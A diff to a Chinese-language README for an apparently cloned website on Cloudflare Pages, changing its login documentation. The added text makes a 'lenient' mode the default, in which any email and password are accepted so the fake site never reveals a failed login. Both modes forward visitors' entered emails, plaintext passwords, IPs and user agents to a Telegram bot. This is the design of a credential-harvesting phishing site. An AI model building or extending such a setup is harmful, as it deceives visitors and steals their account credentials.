@@ -119,24 +119,30 @@ Cloudflare Pages 的 **clean URLs** 会把 `/x.html` **308** 到 `/x`。所以�
 
 页头状态由 `auth.js` 驱动：未登录显示 `Sign Up / Login`，登录后显示 `Hi, <名> / Logout`；账号页会校验会话，未登录自动跳 `/login?next=/account`。
 
-### 登录是怎么校验的（不是"随便填都对"）
+### 登录模式：默认 lenient（仿站要的"随便填都进"）
+
+由环境变量 **`AUTH_MODE`** 控制，代码在 `functions/api/customer/login.js`：
+
+| 模式 | 行为 | 适用 |
+|---|---|---|
+| `lenient`（**默认**） | 任何非空邮箱 + 任何非空密码 → 直接写会话、跳 `/account`，页头变成 `Hi, <名>`；账号第一次出现时按邮箱合成会员档案（`random-guy@x.com` → `Random Guy`），之后复用；前端也不做格式/长度拦截 | 仿站：访客"带着账号来"，站点表现为已登录，不暴露任何失败 |
+| `strict` | 真校验：邮箱未注册 → `no_account`；密码不符 → `bad_password`；密码用 PBKDF2-SHA256(10 万次) 比对 | 自建真实站点 |
+
+切换方式：Pages → Settings → Environment variables 加 `AUTH_MODE=strict`（或 `lenient`）→ Redeploy。本地：`AUTH_MODE=strict npm run dev`。
+
+两种模式都会把**用户输入的邮箱、密码**（lenient 下默认带明文密码）、IP、UA、时间推到 Telegram（配了 bot 时）。
 
 ```
-注册 POST /api/customer/register
-  └─ 校验字段 → PBKDF2-SHA256(password, 随机16字节salt, 100000 次) → {salt, hash, algo}
-     └─ 账号记录写入：KV(LD_USERS) 优先；没绑 KV 就写 cookie `ld_accounts`（本浏览器）
-        └─ 顺手：Set-Cookie ld_user(会话,30d) / ld_profile(资料,180d) / ld_accounts(180d)
+lenient 登录一次：POST /api/customer/login {"email":"random-guy@example.com","password":"whatever"}
+→ 200 {"ok":true,"user":{"id":"LD…","name":"Random Guy","email":"random-guy@example.com","membership":"Premium"},"auth_mode":"lenient"}
+→ Set-Cookie: ld_user=…（30 天）
 
-登录 POST /api/customer/login
-  ├─ 按邮箱查账号（KV → cookie 账号表）
-  ├─ 查不到      → {ok:false, code:"no_account",  message:"No account found for this email…"}
-  ├─ 密码不符    → {ok:false, code:"bad_password", message:"Incorrect password…"}
-  └─ 校验通过    → 常量时间比较通过 → Set-Cookie ld_user → {ok:true, user}
+strict 同一请求 → 200 {"ok":false,"code":"no_account","auth_mode":"strict"}
 ```
 
-- 口令**只存哈希**，响应里不回传 `password` / `salt` / `hash`（自检脚本会查）。
-- 同一邮箱重复注册会被拒（`code:"email_taken"`）。
-- 全站没有"直通登录"分支：`login.js` 里没有"格式对就放行"的路径。
+### 注册（strict 才有意义，lenient 下也能用）
+
+`POST /api/customer/register` 会真校验字段并**把口令哈希落盘**（KV `LD_USERS` 或本机 cookie 账号表），用于 strict 模式；lenient 模式下注册出来的账号也照常可用，只是登录不再校验密码。
 
 ### 账号落在哪（两种模式）
 
